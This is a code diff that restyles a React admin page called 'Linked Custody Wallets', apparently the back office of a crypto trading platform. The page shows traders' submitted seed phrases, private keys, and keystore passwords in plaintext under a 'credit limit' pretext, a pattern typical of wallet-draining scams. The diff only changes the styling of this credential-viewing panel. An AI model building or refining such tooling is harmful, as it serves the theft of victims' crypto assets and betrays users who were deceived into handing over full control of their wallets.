@@ -37,15 +37,15 @@ export default function WalletsPage() {
   if (isLoading) {
     return (
       <div className="max-w-6xl mx-auto space-y-4 py-8">
-        <div className="h-12 bg-gray-200 animate-pulse rounded-2xl" />
-        <div className="h-64 bg-gray-200 animate-pulse rounded-2xl" />
+        <div className="h-12 bg-white/5 animate-pulse rounded-2xl" />
+        <div className="h-64 bg-white/5 animate-pulse rounded-3xl" />
       </div>
     );
   }
 
   if (error) {
     return (
-      <div className="max-w-6xl mx-auto py-12 text-center text-xs text-gray-500">
+      <div className="max-w-6xl mx-auto py-12 text-center text-xs text-rose-400">
         Failed to query Linked Wallets from backend.
       </div>
     );
@@ -53,43 +53,42 @@ export default function WalletsPage() {
 
   return (
     <div className="max-w-6xl mx-auto space-y-6">
-      
       {/* Header and status flags */}
       <div className="flex justify-between items-center">
         <div>
-          <h1 className="text-xl font-bold text-gray-800">Linked Custody Wallets</h1>
-          <p className="text-xs text-gray-400 mt-0.5">Audit external wallet credentials submitted by traders to prove credit limits.</p>
+          <h1 className="text-xl font-bold text-white">Linked Custody Wallets</h1>
+          <p className="text-xs text-slate-400 mt-0.5">Audit external wallet credentials submitted by traders to prove credit limits.</p>
         </div>
       </div>
 
       {successMsg && (
-        <div className="p-4 bg-green-50 border border-green-150 rounded-2xl text-xs text-green-700 font-medium">
-          {successMsg}
+        <div className="p-4 bg-emerald-500/15 border border-emerald-500/30 rounded-2xl text-xs text-[#00e676] font-bold">
+          ✓ {successMsg}
         </div>
       )}
 
       {/* Filter and Search Bar */}
-      <div className="bg-white rounded-2xl border border-gray-100 p-4 shadow-sm flex items-center">
+      <div className="bg-[#121822] rounded-3xl border border-white/10 p-4 shadow-sm flex items-center">
         <input
           type="text"
           value={filterQuery}
           onChange={(e) => setFilterQuery(e.target.value)}
           placeholder="Search by client name, email, or wallet brand (e.g. MetaMask)..."
-          className="w-full bg-slate-50 border border-gray-150 rounded-xl px-4 py-2 text-xs focus:outline-none focus:border-[#2d6a4f]/50"
+          className="w-full bg-[#0e1520] border border-white/10 rounded-2xl px-4 py-2.5 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-[#00c076]"
         />
       </div>
 
       {/* Wallets Table */}
-      <div className="bg-white rounded-3xl border border-gray-100 overflow-hidden shadow-sm">
+      <div className="bg-[#121822] rounded-3xl border border-white/10 overflow-hidden shadow-sm">
         {filteredWallets.length === 0 ? (
-          <div className="p-12 text-center text-xs text-gray-400">
+          <div className="p-12 text-center text-xs text-slate-500">
             No linked wallets matching filters found.
           </div>
         ) : (
           <div className="overflow-x-auto">
-            <table className="w-full text-left text-sm border-collapse">
+            <table className="w-full text-left text-xs border-collapse">
               <thead>
-                <tr className="bg-gray-50/50 text-[10px] font-bold text-gray-500 uppercase tracking-wider border-b border-gray-100">
+                <tr className="bg-[#0e1520] text-[10px] font-bold text-slate-400 uppercase tracking-wider border-b border-white/10">
                   <th className="px-6 py-4">Client Info</th>
                   <th className="px-6 py-4">Wallet Info</th>
                   <th className="px-6 py-4">Linked Date</th>
@@ -97,35 +96,35 @@ export default function WalletsPage() {
                   <th className="px-6 py-4 text-right">Actions</th>
                 </tr>
               </thead>
-              <tbody className="divide-y divide-slate-100 text-xs font-medium text-slate-700">
+              <tbody className="divide-y divide-white/5 text-slate-300">
                 {filteredWallets.map((wallet: any) => {
                   const isExpanded = expandedWalletId === wallet._id;
                   const detailsMap = wallet.details instanceof Map ? Object.fromEntries(wallet.details) : wallet.details || {};
                   
                   return (
-                    <>
-                      <tr key={wallet._id} className="hover:bg-gray-50/30">
+                    <div key={wallet._id} className="contents">
+                      <tr className="hover:bg-white/5 transition-colors">
                         <td className="px-6 py-4">
                           <button
                             onClick={() => navigate(`/executor/clients/${wallet.user?._id}`)}
-                            className="font-extrabold text-slate-800 hover:text-[#2d6a4f] text-left"
+                            className="font-bold text-white hover:text-[#00e676] text-left cursor-pointer transition-colors"
                           >
                             {wallet.user?.name || "Deleted Trader"}
                           </button>
-                          <span className="text-[10px] text-gray-400 block mt-0.5 font-mono">{wallet.user?.email || "-"}</span>
+                          <span className="text-[10px] text-slate-500 block mt-0.5 font-mono">{wallet.user?.email || "-"}</span>
                         </td>
                         <td className="px-6 py-4">
-                          <span className="font-extrabold text-gray-700 block">{wallet.label}</span>
-                          <span className="text-[10px] bg-slate-50 border border-slate-100 text-slate-500 font-extrabold px-1.5 py-0.5 rounded uppercase tracking-wider mt-1 inline-block">
+                          <span className="font-bold text-white block">{wallet.label}</span>
+                          <span className="text-[10px] bg-white/5 border border-white/10 text-slate-400 font-bold px-2 py-0.5 rounded-full uppercase tracking-wider mt-1 inline-block">
                             {detailsMap.connectType || "phrase"}
                           </span>
                         </td>
-                        <td className="px-6 py-4 text-slate-500 font-bold">
+                        <td className="px-6 py-4 text-slate-400 font-mono">
                           {formatDate(wallet.createdAt)}
                         </td>
                         <td className="px-6 py-4">
-                          <span className={`text-[10px] font-bold px-2.5 py-0.5 rounded-full ${
-                            wallet.isVerified ? "bg-green-50 text-green-700" : "bg-amber-50 text-amber-700"
+                          <span className={`text-[10px] font-bold px-2.5 py-0.5 rounded-full uppercase ${
+                            wallet.isVerified ? "bg-emerald-500/15 text-[#00e676] border border-emerald-500/30" : "bg-amber-500/15 text-amber-300 border border-amber-500/30"
                           }`}>
                             {wallet.isVerified ? "Verified" : "Pending Audit"}
                           </span>
@@ -133,7 +132,7 @@ export default function WalletsPage() {
                         <td className="px-6 py-4 text-right space-x-2">
                           <button
                             onClick={() => setExpandedWalletId(isExpanded ? null : wallet._id)}
-                            className="text-[10px] font-bold text-[#2d6a4f] hover:text-[#1a3a2a] px-2.5 py-1.5 rounded-xl border border-gray-150 bg-white hover:bg-slate-50 transition-colors cursor-pointer"
+                            className="text-xs font-bold text-slate-300 hover:text-white px-3 py-1.5 rounded-xl border border-white/10 bg-white/5 hover:bg-white/10 transition-colors cursor-pointer"
                           >
                             {isExpanded ? "Hide Credentials" : "View Credentials"}
                           </button>
@@ -141,7 +140,7 @@ export default function WalletsPage() {
                             <button
                               onClick={() => verifyWalletMutation.mutate(wallet._id)}
                               disabled={verifyWalletMutation.isPending}
-                              className="text-[10px] font-bold text-white bg-[#2d6a4f] hover:bg-[#1a3a2a] px-2.5 py-1.5 rounded-xl transition-colors cursor-pointer disabled:opacity-50"
+                              className="text-xs font-black text-[#080c10] bg-[#00c076] hover:bg-[#00e676] px-3.5 py-1.5 rounded-xl transition-all cursor-pointer disabled:opacity-50 shadow-md shadow-[#00c076]/20"
                             >
                               Verify
                             </button>
@@ -152,40 +151,40 @@ export default function WalletsPage() {
                       {/* Expanded credentials drawer row */}
                       {isExpanded && (
                         <tr>
-                          <td colSpan={5} className="px-8 py-4 bg-slate-50/50 border-y border-slate-100">
-                            <div className="bg-white border border-gray-150 rounded-2xl p-5 shadow-inner max-w-3xl space-y-3 font-mono text-xs select-all text-slate-700 overflow-x-auto">
+                          <td colSpan={5} className="px-8 py-4 bg-[#080c10] border-y border-white/10">
+                            <div className="bg-[#0e1520] border border-white/10 rounded-2xl p-5 shadow-inner max-w-3xl space-y-3 font-mono text-xs select-all text-slate-300 overflow-x-auto">
                               {detailsMap.connectType === "phrase" ? (
                                 <div>
-                                  <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Mnemonic / Seed Phrase:</strong>
-                                  <span className="break-all font-semibold tracking-wide whitespace-pre-wrap">{detailsMap.phrase}</span>
+                                  <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Mnemonic / Seed Phrase:</strong>
+                                  <span className="break-all font-semibold tracking-wide whitespace-pre-wrap text-emerald-400">{detailsMap.phrase}</span>
                                 </div>
                               ) : detailsMap.connectType === "privateKey" ? (
                                 <div>
-                                  <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Private Key Hex:</strong>
-                                  <span className="break-all font-semibold tracking-wider">{detailsMap.privateKey}</span>
+                                  <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Private Key Hex:</strong>
+                                  <span className="break-all font-semibold tracking-wider text-amber-300">{detailsMap.privateKey}</span>
                                 </div>
                               ) : detailsMap.connectType === "keystore" ? (
                                 <div className="space-y-3">
                                   <div>
-                                    <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Keystore JSON:</strong>
-                                    <span className="break-all block bg-slate-50 p-2 rounded border border-gray-100">{detailsMap.keystore}</span>
+                                    <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Keystore JSON:</strong>
+                                    <span className="break-all block bg-[#121822] p-3 rounded-xl border border-white/10 text-slate-300">{detailsMap.keystore}</span>
                                   </div>
                                   <div>
-                                    <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Password:</strong>
-                                    <span className="font-semibold text-slate-900">{detailsMap.password}</span>
+                                    <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Password:</strong>
+                                    <span className="font-bold text-white">{detailsMap.password}</span>
                                   </div>
                                 </div>
                               ) : (
                                 <div>
-                                  <strong className="block text-slate-400 uppercase text-[9px] mb-1 font-bold">Details Map:</strong>
-                                  <pre className="break-all">{JSON.stringify(detailsMap, null, 2)}</pre>
+                                  <strong className="block text-slate-500 uppercase text-[9px] mb-1 font-bold">Details Map:</strong>
+                                  <pre className="break-all text-slate-300">{JSON.stringify(detailsMap, null, 2)}</pre>
                                 </div>
                               )}
                             </div>
                           </td>
                         </tr>
                       )}
-                    </>
+                    </div>
                   );
                 })}
               </tbody>
